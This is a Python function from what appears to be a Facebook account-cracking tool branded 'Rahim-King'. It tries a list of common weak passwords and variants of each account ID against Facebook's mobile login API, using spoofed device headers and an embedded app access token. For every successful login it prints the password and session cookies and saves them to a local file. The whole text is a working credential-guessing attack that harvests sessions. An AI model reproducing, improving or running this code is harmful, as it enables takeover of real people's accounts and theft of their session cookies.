def login(uid, tl):
    global oks, loop
    try:
        sys.stdout.write(f"\r➤ {g}Rahim{r}-{g}King {r}[{g}{loop}{r}/{w}{tl}{r}] [{g}OK{r}/{g}{len(oks)}{r}]")
        sys.stdout.flush()
        
        # Enhanced password list for 2011-2013
        passwords = [
            "123456", "1234567", "12345678", "123456789", "123123",
            "password", "000000", "12345", uid[3:8],
            # Gmail patterns
            "gmail123", "gmail786", "gmail1122", 
            # Year based
            "20112011", "20122012", "20132013",
            "112233", "223344", "556677",
            # Common patterns
            "786786", "1234512345", "123456123456",
            "bangladesh", "Bangladesh", "bangladesh123",
            "i love you", "iloveyou",
            # Parts of UID
            uid[3:], uid[4:], uid[5:]
        ]
        
        for pw in passwords:
            # Enhanced headers with random elements
            headers = {
                "User-Agent": Rahim_all(),
                "Host": "graph.facebook.com",
                "Content-Type": "application/x-www-form-urlencoded",
                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                "X-FB-Connection-Type": random.choice(["MOBILE.LTE", "MOBILE.4G", "MOBILE.3G"]),
                "X-Tigon-Is-Retry": "False",
                "x-fb-session-id": f"nid=jiZ+yNNBgbwC;pid=Main;tid={random.randint(1000, 9999)};nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
                "x-fb-device-group": "5120",
                "X-FB-Friendly-Name": "ViewerReactionsMutation",
                "X-FB-Request-Analytics-Tags": "graphservice",
                "X-FB-HTTP-Engine": "Liger",
                "X-FB-Client-IP": "True",
                "X-FB-Server-Cluster": "True",
                "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"
            }

            url = f'https://b-api.facebook.com/method/auth.login?format=json&email={uid}&password={pw}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true'
            
            rp = requests.get(url, headers=headers).json()
            
            if "session_key" in rp:
                # Extract cookies
                try:
                    coki = ";".join([key+"="+value for key,value in rp.get("session_cookies", [])])
                except:
                    coki = "No Cookies"
                    
                # Check account type
                if "@gmail.com" in str(uid):
                    acc_type = "GMAIL"
                elif "@yahoo.com" in str(uid):
                    acc_type = "YAHOO"
                else:
                    acc_type = "FACEBOOK"
                    
                # Get creation date
                creation_date = Rahimx(uid)
                
                print(f"\r\r{g}SUCCESS {p}➤ {w}{uid}")
                print(f"{g}[{w}PASS{g}]{r}: {w}{pw}")
                print(f"{g}[{w}COOKIE{g}]{r}: {w}{coki}")
                print(f"{g}[{w}CREATED{g}]{r}: {w}{creation_date}")
                print(f"{g}[{w}TYPE{g}]{r}: {w}{acc_type}")
                lin()
                
                open("/sdcard/Rahim-OLD-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                oks.append(uid)
                break
                
            elif "www.facebook.com" in str(rp):
                continue
                
        loop += 1
        
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
